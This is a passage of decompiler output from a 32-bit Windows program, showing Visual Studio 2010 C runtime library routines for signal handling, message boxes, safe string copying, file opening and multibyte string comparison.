      uVar2 = unaff_ESI[2];
      uVar3 = unaff_ESI[3];
      *puVar18 = *unaff_ESI;
      puVar18[1] = uVar1;
      puVar18[2] = uVar2;
      puVar18[3] = uVar3;
      unaff_ESI = unaff_ESI + 4;
      puVar18 = puVar18 + 4;
    }
    if ((param_1 & 0xf) != 0) {
      for (uVar16 = (param_1 & 0xf) >> 2; uVar16 != 0; uVar16 = uVar16 - 1) {
        *puVar18 = *unaff_ESI;
        unaff_ESI = unaff_ESI + 1;
        puVar18 = puVar18 + 1;
      }
      for (uVar16 = param_1 & 3; uVar16 != 0; uVar16 = uVar16 - 1) {
        *(undefined *)puVar18 = *(undefined *)unaff_ESI;
        unaff_ESI = (undefined4 *)((int)unaff_ESI + 1);
        puVar18 = (undefined4 *)((int)puVar18 + 1);
      }
    }
  }
  return unaff_EDI;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
// Library: Visual Studio 2010 Release

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
                    // WARNING: Subroutine does not return
  _abort();
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040eea7(void)

{
  _DAT_00417c8c = EncodePointer(terminate);
  return;
}



// Library Function - Single Match
//  __initp_misc_winsig
// 
// Library: Visual Studio 2010 Release

void __cdecl __initp_misc_winsig(undefined4 param_1)

{
  DAT_00417c90 = param_1;
  DAT_00417c94 = param_1;
  DAT_00417c98 = param_1;
  DAT_00417c9c = param_1;
  return;
}



// Library Function - Single Match
//  _siglookup
// 
// Library: Visual Studio 2010 Release

uint __fastcall _siglookup(undefined4 param_1,int param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3;
  do {
    if (*(int *)(uVar1 + 4) == param_2) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_00412d5c * 0xc + param_3);
  if ((DAT_00412d5c * 0xc + param_3 <= uVar1) || (*(int *)(uVar1 + 4) != param_2)) {
    uVar1 = 0;
  }
  return uVar1;
}



void FUN_0040ef0d(void)

{
  DecodePointer(DAT_00417c98);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2010 Release

int __cdecl _raise(int _SigNum)

{
  uint uVar1;
  int *piVar2;
  PVOID Ptr;
  code *pcVar3;
  int _File;
  code *pcVar4;
  undefined4 extraout_ECX;
  code **ppcVar5;
  _ptiddata p_Var6;
  int local_34;
  void *local_30;
  int local_28;
  int local_20;
  
  p_Var6 = (_ptiddata)0x0;
  local_20 = 0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        ppcVar5 = (code **)&DAT_00417c90;
        Ptr = DAT_00417c90;
        goto LAB_0040efc4;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_0040efa2;
        if (_SigNum != 8) goto LAB_0040ef90;
      }
    }
    p_Var6 = __getptd_noexit();
    if (p_Var6 == (_ptiddata)0x0) {
      return -1;
    }
    uVar1 = _siglookup(extraout_ECX,_SigNum,(uint)p_Var6->_pxcptacttab);
    ppcVar5 = (code **)(uVar1 + 8);
    pcVar3 = *ppcVar5;
  }
  else {
    if (_SigNum == 0xf) {
      ppcVar5 = (code **)&DAT_00417c9c;
      Ptr = DAT_00417c9c;
    }
    else if (_SigNum == 0x15) {
      ppcVar5 = (code **)&DAT_00417c94;
      Ptr = DAT_00417c94;
    }
    else {
      if (_SigNum != 0x16) {
LAB_0040ef90:
        piVar2 = __errno();
        *piVar2 = 0x16;
        FUN_004071df();
        return -1;
      }
LAB_0040efa2:
      ppcVar5 = (code **)&DAT_00417c98;
      Ptr = DAT_00417c98;
    }
LAB_0040efc4:
    local_20 = 1;
    pcVar3 = (code *)DecodePointer(Ptr);
  }
  _File = 0;
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 == (code *)0x0) {
    _File = __exit(3);
  }
  if (local_20 != _File) {
    __lock(_File);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_30 = p_Var6->_tpxcptinfoptrs;
    p_Var6->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_34 = p_Var6->_tfpecode;
      p_Var6->_tfpecode = 0x8c;
      goto LAB_0040f028;
    }
  }
  else {
LAB_0040f028:
    if (_SigNum == 8) {
      for (local_28 = DAT_00412d50; local_28 < DAT_00412d54 + DAT_00412d50; local_28 = local_28 + 1)
      {
        *(undefined4 *)(local_28 * 0xc + 8 + (int)p_Var6->_pxcptacttab) = 0;
      }
      goto LAB_0040f060;
    }
  }
  pcVar4 = (code *)FUN_0040ac93();
  *ppcVar5 = pcVar4;
LAB_0040f060:
  FUN_0040f081();
  if (_SigNum == 8) {
    (*pcVar3)(8,p_Var6->_tfpecode);
  }
  else {
    (*pcVar3)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var6->_tpxcptinfoptrs = local_30;
  if (_SigNum == 8) {
    p_Var6->_tfpecode = local_34;
  }
  return 0;
}



void FUN_0040f081(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_0040da13(0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0040f0bd(undefined4 param_1)

{
  _DAT_00417ca4 = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0040f0cc(undefined4 param_1)

{
  _DAT_00417ca8 = param_1;
  return;
}



// Library Function - Single Match
//  ___crtMessageBoxW
// 
// Library: Visual Studio 2010 Release

int __cdecl ___crtMessageBoxW(LPCWSTR _LpText,LPCWSTR _LpCaption,UINT _UType)

{
  HMODULE hModule;
  FARPROC pFVar1;
  code *pcVar2;
  code *pcVar3;
  int iVar4;
  undefined local_28 [4];
  LPCWSTR local_24;
  LPCWSTR local_20;
  PVOID local_1c;
  int local_18;
  undefined local_14 [8];
  byte local_c;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_24 = _LpText;
  local_20 = _LpCaption;
  local_1c = (PVOID)FUN_0040ac93();
  local_18 = 0;
  if (DAT_00417cac == (PVOID)0x0) {
    hModule = LoadLibraryW(u_USER32_DLL_00413328);
    if ((hModule == (HMODULE)0x0) ||
       (pFVar1 = GetProcAddress(hModule,s_MessageBoxW_0041331c), pFVar1 == (FARPROC)0x0))
    goto LAB_0040f238;
    DAT_00417cac = EncodePointer(pFVar1);
    pFVar1 = GetProcAddress(hModule,s_GetActiveWindow_0041330c);
    DAT_00417cb0 = EncodePointer(pFVar1);
    pFVar1 = GetProcAddress(hModule,s_GetLastActivePopup_004132f8);
    DAT_00417cb4 = EncodePointer(pFVar1);
    pFVar1 = GetProcAddress(hModule,s_GetUserObjectInformationW_004132dc);
    DAT_00417cbc = EncodePointer(pFVar1);
    if (DAT_00417cbc != (PVOID)0x0) {
      pFVar1 = GetProcAddress(hModule,s_GetProcessWindowStation_004132c4);
      DAT_00417cb8 = EncodePointer(pFVar1);
    }
  }
  if ((DAT_00417cb8 == local_1c) || (DAT_00417cbc == local_1c)) {
LAB_0040f1e7:
    if ((((DAT_00417cb0 != local_1c) &&
         (pcVar2 = (code *)DecodePointer(DAT_00417cb0), pcVar2 != (code *)0x0)) &&
        (local_18 = (*pcVar2)(), local_18 != 0)) &&
       ((DAT_00417cb4 != local_1c &&
        (pcVar2 = (code *)DecodePointer(DAT_00417cb4), pcVar2 != (code *)0x0)))) {
      local_18 = (*pcVar2)(local_18);
    }
  }
  else {
    pcVar2 = (code *)DecodePointer(DAT_00417cb8);
    pcVar3 = (code *)DecodePointer(DAT_00417cbc);
    if (((pcVar2 == (code *)0x0) || (pcVar3 == (code *)0x0)) ||
       (((iVar4 = (*pcVar2)(), iVar4 != 0 &&
         (iVar4 = (*pcVar3)(iVar4,1,local_14,0xc,local_28), iVar4 != 0)) && ((local_c & 1) != 0))))
    goto LAB_0040f1e7;
    _UType = _UType | 0x200000;
  }
  pcVar2 = (code *)DecodePointer(DAT_00417cac);
  if (pcVar2 != (code *)0x0) {
    (*pcVar2)(local_18,local_24,local_20,_UType);
  }
LAB_0040f238:
  iVar4 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar4;
}



// Library Function - Single Match
//  _wcsncpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wcsncpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src,rsize_t _MaxCount)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  int iVar4;
  rsize_t rVar5;
  errno_t eStack_14;
  
  if (_MaxCount == 0) {
    if (_Dst == (wchar_t *)0x0) {
      if (_SizeInWords == 0) {
        return 0;
      }
    }
    else {
LAB_0040f26d:
      if (_SizeInWords != 0) {
        if (_MaxCount == 0) {
          *_Dst = L'\0';
          return 0;
        }
        if (_Src != (wchar_t *)0x0) {
          rVar5 = _SizeInWords;
          if (_MaxCount == 0xffffffff) {
            iVar4 = (int)_Dst - (int)_Src;
            do {
              wVar1 = *_Src;
              *(wchar_t *)(iVar4 + (int)_Src) = wVar1;
              _Src = _Src + 1;
              if (wVar1 == L'\0') break;
              rVar5 = rVar5 - 1;
            } while (rVar5 != 0);
          }
          else {
            pwVar3 = _Dst;
            do {
              wVar1 = *(wchar_t *)(((int)_Src - (int)_Dst) + (int)pwVar3);
              *pwVar3 = wVar1;
              pwVar3 = pwVar3 + 1;
              if ((wVar1 == L'\0') || (rVar5 = rVar5 - 1, rVar5 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pwVar3 = L'\0';
            }
          }
          if (rVar5 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInWords - 1] = L'\0';
            return 0x50;
          }
          *_Dst = L'\0';
          piVar2 = __errno();
          eStack_14 = 0x22;
          *piVar2 = 0x22;
          goto LAB_0040f27e;
        }
        *_Dst = L'\0';
      }
    }
  }
  else if (_Dst != (wchar_t *)0x0) goto LAB_0040f26d;
  piVar2 = __errno();
  eStack_14 = 0x16;
  *piVar2 = 0x16;
LAB_0040f27e:
  FUN_004071df();
  return eStack_14;
}



// Library Function - Single Match
//  _wcslen
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release, Visual Studio 2015 Release,
// Visual Studio 2019 Release

size_t __cdecl _wcslen(wchar_t *_Str)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  return ((int)pwVar2 - (int)_Str >> 1) - 1;
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2010 Release

int __cdecl __set_error_mode(int _Mode)

{
  int iVar1;
  int *piVar2;
  
  if (-1 < _Mode) {
    if (_Mode < 3) {
      iVar1 = DAT_00416f48;
      DAT_00416f48 = _Mode;
      return iVar1;
    }
    if (_Mode == 3) {
      return DAT_00416f48;
    }
  }
  piVar2 = __errno();
  *piVar2 = 0x16;
  FUN_004071df();
  return -1;
}



int __cdecl FUN_0040f36e(undefined4 *param_1,LPCSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint *in_EAX;
  errno_t eVar3;
  uint uVar4;
  ulong *puVar5;
  int *piVar6;
  DWORD DVar7;
  long lVar8;
  int iVar9;
  HANDLE pvVar10;
  byte bVar11;
  int unaff_EDI;
  int iVar12;
  bool bVar13;
  longlong lVar14;
  int iVar15;
  _SECURITY_ATTRIBUTES local_34;
  uint local_28;
  HANDLE local_24;
  uint local_20;
  DWORD local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  char local_8;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar13 = (param_3 & 0x80) == 0;
  local_28 = 0;
  local_6 = 0;
  local_c = 0;
  local_34.nLength = 0xc;
  local_34.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar13) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_34.bInheritHandle = (BOOL)bVar13;
  eVar3 = __get_fmode((int *)&local_28);
  if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_28 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar4 = param_3 & 3;
  if (uVar4 == 0) {
    local_10 = 0x80000000;
  }
  else {
    if (uVar4 == 1) {
      if (((param_3 & 8) == 0) || ((param_3 & 0x70000) == 0)) {
        local_10 = 0x40000000;
        goto LAB_0040f430;
      }
    }
    else if (uVar4 != 2) goto LAB_0040f3f0;
    local_10 = 0xc0000000;
  }
LAB_0040f430:
  if (param_4 == 0x10) {
    local_18 = 0;
  }
  else if (param_4 == 0x20) {
    local_18 = 1;
  }
  else if (param_4 == 0x30) {
    local_18 = 2;
  }
  else if (param_4 == 0x40) {
    local_18 = 3;
  }
  else {
    if (param_4 != 0x80) {
LAB_0040f3f0:
      puVar5 = ___doserrno();
      *puVar5 = 0;
      *in_EAX = 0xffffffff;
      piVar6 = __errno();
      *piVar6 = 0x16;
      FUN_004071df();
      return 0x16;
    }
    local_18 = (uint)(local_10 == 0x80000000);
  }
  uVar4 = param_3 & 0x700;
  if (uVar4 < 0x401) {
    if ((uVar4 == 0x400) || (uVar4 == 0)) {
      local_1c = 3;
    }
    else if (uVar4 == 0x100) {
      local_1c = 4;
    }
    else {
      if (uVar4 == 0x200) goto LAB_0040f4f2;
      if (uVar4 != 0x300) goto LAB_0040f4d2;
      local_1c = 2;
    }
  }
  else {
    if (uVar4 != 0x500) {
      if (uVar4 == 0x600) {
LAB_0040f4f2:
        local_1c = 5;
        goto LAB_0040f502;
      }
      if (uVar4 != 0x700) {
LAB_0040f4d2:
        puVar5 = ___doserrno();
        *puVar5 = 0;
        *in_EAX = 0xffffffff;
        piVar6 = __errno();
        *piVar6 = 0x16;
        FUN_004071df();
        return 0x16;
      }
    }
    local_1c = 1;
  }
LAB_0040f502:
  local_14 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_0041728c & param_5))) {
    local_14 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_14 = local_14 | 0x4000000;
    local_10 = local_10 | 0x10000;
    local_18 = local_18 | 4;
  }
  if ((param_3 & 0x1000) != 0) {
    local_14 = local_14 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      local_14 = local_14 | 0x10000000;
    }
  }
  else {
    local_14 = local_14 | 0x8000000;
  }
  uVar4 = __alloc_osfhnd();
  *in_EAX = uVar4;
  if (uVar4 == 0xffffffff) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    *in_EAX = 0xffffffff;
    piVar6 = __errno();
    *piVar6 = 0x18;
    piVar6 = __errno();
    return *piVar6;
  }
  *param_1 = 1;
  local_24 = CreateFileA(param_2,local_10,local_18,&local_34,local_1c,local_14,(HANDLE)0x0);
  if (local_24 == (HANDLE)0xffffffff) {
    if (((local_10 & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
      local_10 = local_10 & 0x7fffffff;
      local_24 = CreateFileA(param_2,local_10,local_18,&local_34,local_1c,local_14,(HANDLE)0x0);
      if (local_24 != (HANDLE)0xffffffff) goto LAB_0040f62a;
    }
    pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    goto LAB_0040f61b;
  }
LAB_0040f62a:
  DVar7 = GetFileType(local_24);
  if (DVar7 == 0) {
    pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    CloseHandle(local_24);
    if (DVar7 == 0) {
      piVar6 = __errno();
      *piVar6 = 0xd;
    }
    goto LAB_0040f61b;
  }
  if (DVar7 == 2) {
    local_5 = local_5 | 0x40;
  }
  else if (DVar7 == 3) {
    local_5 = local_5 | 8;
  }
  __set_osfhnd(*in_EAX,(intptr_t)local_24);
  bVar11 = local_5 | 1;
  *(byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40) = bVar11;
  pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  if (local_7 == 0) {
    bVar2 = local_5 & 0x80;
    local_5 = bVar11;
    if (bVar2 == 0) goto LAB_0040f990;
    if ((param_3 & 2) == 0) goto LAB_0040f75e;
    lVar8 = __lseek_nolock(*in_EAX,-1,2);
    if (lVar8 == -1) {
      puVar5 = ___doserrno();
      bVar11 = local_5;
      if (*puVar5 == 0x83) goto LAB_0040f75e;
    }
    else {
      local_8 = '\0';
      iVar12 = __read_nolock(*in_EAX,&local_8,1);
      if ((((iVar12 != 0) || (local_8 != '\x1a')) ||
          (iVar12 = __chsize_nolock(*in_EAX,CONCAT44(unaff_EDI,lVar8 >> 0x1f)), iVar12 != -1)) &&
         (lVar8 = __lseek_nolock(*in_EAX,0,0), bVar11 = local_5, lVar8 != -1)) goto LAB_0040f75e;
    }
LAB_0040f70f:
    __close_nolock(*in_EAX);
    goto LAB_0040f61b;
  }
LAB_0040f75e:
  local_5 = bVar11;
  if ((local_5 & 0x80) != 0) {
    if ((param_3 & 0x74000) == 0) {
      if ((local_28 & 0x74000) == 0) {
        param_3 = param_3 | 0x4000;
      }
      else {
        param_3 = param_3 | local_28 & 0x74000;
      }
    }
    uVar4 = param_3 & 0x74000;
    if (uVar4 == 0x4000) {
      local_6 = 0;
    }
    else if ((uVar4 == 0x10000) || (uVar4 == 0x14000)) {
      if ((param_3 & 0x301) == 0x301) goto LAB_0040f7cd;
    }
    else if ((uVar4 == 0x20000) || (uVar4 == 0x24000)) {
LAB_0040f7cd:
      local_6 = 2;
    }
    else if ((uVar4 == 0x40000) || (uVar4 == 0x44000)) {
      local_6 = 1;
    }
    if (((param_3 & 0x70000) != 0) && (local_20 = 0, (local_5 & 0x40) == 0)) {
      uVar4 = local_10 & 0xc0000000;
      if (uVar4 == 0x40000000) {
        if (local_1c == 0) goto LAB_0040f990;
        if (2 < local_1c) {
          if (local_1c < 5) {
            lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
            if (lVar14 == 0) goto LAB_0040f835;
            lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
            uVar4 = (uint)lVar14 & (uint)((ulonglong)lVar14 >> 0x20);
            goto LAB_0040f8fa;
          }
LAB_0040f82c:
          if (local_1c != 5) goto LAB_0040f990;
        }
LAB_0040f835:
        iVar12 = 0;
        if (local_6 == 1) {
          local_20 = 0xbfbbef;
          iVar15 = 3;
        }
        else {
          if (local_6 != 2) goto LAB_0040f990;
          local_20 = 0xfeff;
          iVar15 = 2;
        }
        do {
          iVar9 = __write(*in_EAX,(void *)((int)&local_20 + iVar12),iVar15 - iVar12);
          if (iVar9 == -1) goto LAB_0040f70f;
          iVar12 = iVar12 + iVar9;
        } while (iVar12 < iVar15);
      }
      else {
        if (uVar4 != 0x80000000) {
          if ((uVar4 == 0xc0000000) && (local_1c != 0)) {
            if (2 < local_1c) {
              if (4 < local_1c) goto LAB_0040f82c;
              lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
              if (lVar14 != 0) {
                lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
                if (lVar14 == -1) goto LAB_0040f70f;
                goto LAB_0040f880;
              }
            }
            goto LAB_0040f835;
          }
          goto LAB_0040f990;
        }
LAB_0040f880:
        iVar12 = __read_nolock(*in_EAX,&local_20,3);
        if (iVar12 == -1) goto LAB_0040f70f;
        if (iVar12 == 2) {
LAB_0040f907:
          if ((local_20 & 0xffff) == 0xfffe) {
            __close_nolock(*in_EAX);
            piVar6 = __errno();
            *piVar6 = 0x16;
            return 0x16;
          }
          if ((local_20 & 0xffff) == 0xfeff) {
            lVar8 = __lseek_nolock(*in_EAX,2,0);
            if (lVar8 == -1) goto LAB_0040f70f;
            local_6 = 2;
            goto LAB_0040f990;
          }
        }
        else if (iVar12 == 3) {
          if (local_20 == 0xbfbbef) {
            local_6 = 1;
            goto LAB_0040f990;
          }
          goto LAB_0040f907;
        }
        uVar4 = __lseek_nolock(*in_EAX,0,0);
LAB_0040f8fa:
        if (uVar4 == 0xffffffff) goto LAB_0040f70f;
      }
    }
  }
LAB_0040f990:
  pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
  pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
  if ((local_7 == 0) && ((param_3 & 8) != 0)) {
    pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 | 0x20;
  }
  if ((local_10 & 0xc0000000) != 0xc0000000) {
    return local_c;
  }
  if ((param_3 & 1) == 0) {
    return local_c;
  }
  CloseHandle(local_24);
  pvVar10 = CreateFileA(param_2,local_10 & 0x7fffffff,local_18,&local_34,3,local_14,(HANDLE)0x0);
  if (pvVar10 != (HANDLE)0xffffffff) {
    *(HANDLE *)((*in_EAX & 0x1f) * 0x40 + (&DAT_00418ea0)[(int)*in_EAX >> 5]) = pvVar10;
    return local_c;
  }
  DVar7 = GetLastError();
  __dosmaperr(DVar7);
  pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0xfe;
  __free_osfhnd(*in_EAX);
LAB_0040f61b:
  piVar6 = __errno();
  return *piVar6;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __sopen_helper
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__sopen_helper(char *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00414ff0;
  uStack_c = 0x40faae;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (char *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    FUN_004071df();
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = FUN_0040f36e(local_20,_Filename,_OFlag,_ShFlag,(byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_0040fb38();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_0040fb38(void)

{
  byte *pbVar1;
  int unaff_EBP;
  uint *unaff_ESI;
  int unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_EDI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_EDI) {
      pbVar1 = (byte *)((&DAT_00418ea0)[(int)*unaff_ESI >> 5] + 4 + (*unaff_ESI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  __sopen_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__sopen_s(int *_FileHandle,char *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionMode)

{
  errno_t eVar1;
  
  eVar1 = __sopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionMode,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  __mbsnbicmp_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __mbsnbicmp_l(uchar *_Str1,uchar *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  size_t sVar1;
  uchar *puVar2;
  int iVar3;
  int *piVar4;
  uint uVar5;
  byte *pbVar6;
  _LocaleUpdate local_1c [4];
  int local_18;
  int local_14;
  char local_10;
  ushort local_c;
  ushort local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_1c,_Locale);
  if (_MaxCount == 0) {
    if (local_10 != '\0') {
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
    }
    iVar3 = 0;
  }
  else if (*(int *)(local_18 + 8) == 0) {
    iVar3 = __strnicmp((char *)_Str1,(char *)_Str2,_MaxCount);
    if (local_10 != '\0') {
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
    }
  }
  else if (_Str1 == (uchar *)0x0) {
    piVar4 = __errno();
    *piVar4 = 0x16;
    FUN_004071df();
    if (local_10 != '\0') {
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
    }
    iVar3 = 0x7fffffff;
  }
  else {
    if (_Str2 != (uchar *)0x0) {
      do {
        uVar5 = (uint)*_Str1;
        sVar1 = _MaxCount - 1;
        puVar2 = _Str1 + 1;
        if ((*(byte *)(uVar5 + 0x1d + local_18) & 4) == 0) {
          if ((*(byte *)(uVar5 + local_18 + 0x1d) & 0x10) != 0) {
            uVar5 = (uint)*(byte *)(uVar5 + local_18 + 0x11d);
          }
          local_c = (ushort)uVar5;
          _Str1 = puVar2;
LAB_0040fcd9:
          uVar5 = (uint)*_Str2;
          pbVar6 = _Str2 + 1;
          if ((*(byte *)(uVar5 + 0x1d + local_18) & 4) == 0) {
            if ((*(byte *)(uVar5 + local_18 + 0x1d) & 0x10) != 0) {
              uVar5 = (uint)*(byte *)(uVar5 + local_18 + 0x11d);
            }
            goto LAB_0040fd49;
          }
          if (sVar1 == 0) {
LAB_0040fcef:
            _MaxCount = sVar1;
            local_8 = 0;
          }
          else {
            sVar1 = _MaxCount - 2;
            if (*pbVar6 == 0) goto LAB_0040fcef;
            local_8 = CONCAT11(*_Str2,*pbVar6);
            pbVar6 = _Str2 + 2;
            _MaxCount = sVar1;
            if ((local_8 < *(ushort *)(local_18 + 0x10)) || (*(ushort *)(local_18 + 0x12) < local_8)
               ) {
              if ((*(ushort *)(local_18 + 0x16) <= local_8) &&
                 (local_8 <= *(ushort *)(local_18 + 0x18))) {
                local_8 = local_8 + *(short *)(local_18 + 0x1a);
              }
            }
            else {
              local_8 = local_8 + *(short *)(local_18 + 0x14);
            }
          }
        }
        else {
          if (sVar1 != 0) {
            if (*puVar2 == '\0') {
              local_c = 0;
              _Str1 = puVar2;
            }
            else {
              local_c = CONCAT11(*_Str1,*puVar2);
              _Str1 = _Str1 + 2;
              if ((local_c < *(ushort *)(local_18 + 0x10)) ||
                 (*(ushort *)(local_18 + 0x12) < local_c)) {
                if ((*(ushort *)(local_18 + 0x16) <= local_c) &&
                   (local_c <= *(ushort *)(local_18 + 0x18))) {
                  local_c = local_c + *(short *)(local_18 + 0x1a);
                }
              }
              else {
                local_c = local_c + *(short *)(local_18 + 0x14);
              }
            }
            goto LAB_0040fcd9;
          }
          uVar5 = (uint)*_Str2;
          if ((*(byte *)(uVar5 + 0x1d + local_18) & 4) != 0) {
LAB_0040fd63:
            if (local_10 != '\0') {
              *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
            }
            return 0;
          }
          local_c = 0;
          pbVar6 = _Str2;
          _Str1 = puVar2;
LAB_0040fd49:
          local_8 = (ushort)uVar5;
          _MaxCount = sVar1;
        }
        if (local_8 != local_c) {
          iVar3 = (-(uint)(local_8 < local_c) & 2) - 1;
          if (local_10 == '\0') {
            return iVar3;
          }
          *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
          return iVar3;
        }
        if ((local_c == 0) || (_Str2 = pbVar6, _MaxCount == 0)) goto LAB_0040fd63;
      } while( true );
    }
    piVar4 = __errno();
    *piVar4 = 0x16;
    FUN_004071df();
    if (local_10 != '\0') {
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
    }
    iVar3 = 0x7fffffff;
  }
  return iVar3;
}



// Library Function - Single Match
//  __mbsnbicmp
// 
// Library: Visual Studio 2010 Release

int __cdecl __mbsnbicmp(uchar *_Str1,uchar *_Str2,size_t _MaxCount)

{
  int iVar1;
  
  iVar1 = __mbsnbicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __mbsnbcmp_l
// 
// Library: Visual Studio 2010 Release

